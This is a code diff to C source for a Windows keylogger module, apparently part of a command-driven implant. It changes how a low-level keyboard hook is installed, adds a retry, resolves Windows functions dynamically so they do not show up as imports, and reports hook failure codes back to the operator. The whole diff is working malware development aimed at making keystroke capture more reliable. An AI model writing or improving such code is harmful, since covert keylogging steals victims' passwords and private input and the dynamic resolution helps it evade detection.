@@ -675,6 +675,7 @@ static _kl_fn_CallNext    _klCallNext   = NULL;
 static _kl_fn_GetFgWnd    _klGetFgWnd   = NULL;
 static _kl_fn_GetWndTxt   _klGetWndTxt  = NULL;
 static _kl_fn_GetKeyState _klGetKS      = NULL;
+static volatile DWORD     _kl_last_error = 0;
 
 /* Hook callback — runs in the hook thread context */
 static LRESULT CALLBACK _kl_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -756,13 +757,20 @@ static LRESULT CALLBACK _kl_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
 static DWORD WINAPI _kl_thread_func(LPVOID param) {
     _kl_fn_SetHook fnSetHook = (_kl_fn_SetHook)param;
 
-    /* Resolve GetModuleHandleA for hMod (not an IAT import) */
-    HMODULE hK32 = LoadLibraryA("kernel32.dll");
-    _kl_fn_GetModHandle fnGMH = (_kl_fn_GetModHandle)GetProcAddress(hK32, "GetModuleHandleA");
-    HMODULE hSelf = fnGMH ? fnGMH(NULL) : NULL;
-
-    _kl_hook = fnSetHook(13 /*WH_KEYBOARD_LL*/, _kl_hook_proc, hSelf, 0);
+    /* WH_KEYBOARD_LL: MSDN says pass NULL hMod when hook proc is in
+       the current process (not a DLL) and dwThreadId is 0.
+       Fallback: try with the exe module handle if NULL fails. */
+    _kl_hook = fnSetHook(13 /*WH_KEYBOARD_LL*/, _kl_hook_proc, NULL, 0);
     if (!_kl_hook) {
+        /* Retry with exe module handle */
+        HMODULE hK32 = LoadLibraryA("kernel32.dll");
+        _kl_fn_GetModHandle fnGMH = (_kl_fn_GetModHandle)GetProcAddress(hK32, "GetModuleHandleA");
+        HMODULE hSelf = fnGMH ? fnGMH(NULL) : NULL;
+        if (hSelf)
+            _kl_hook = fnSetHook(13, _kl_hook_proc, hSelf, 0);
+    }
+    if (!_kl_hook) {
+        _kl_last_error = GetLastError();
         InterlockedExchange(&_kl_active, 0);
         return 1;
     }
@@ -833,9 +841,12 @@ void mod_keylogger(Buffer *out, const char *subcmd) {
             return;
         }
 
-        Sleep(100); /* Let hook install */
+        Sleep(200); /* Let hook install */
         if (!_kl_active) {
-            buf_append(out, "Hook installation failed", 24);
+            char errmsg[80];
+            int n = snprintf(errmsg, sizeof(errmsg),
+                             "Hook installation failed (err=%lu)", _kl_last_error);
+            buf_append(out, errmsg, (DWORD)n);
             return;
         }
 
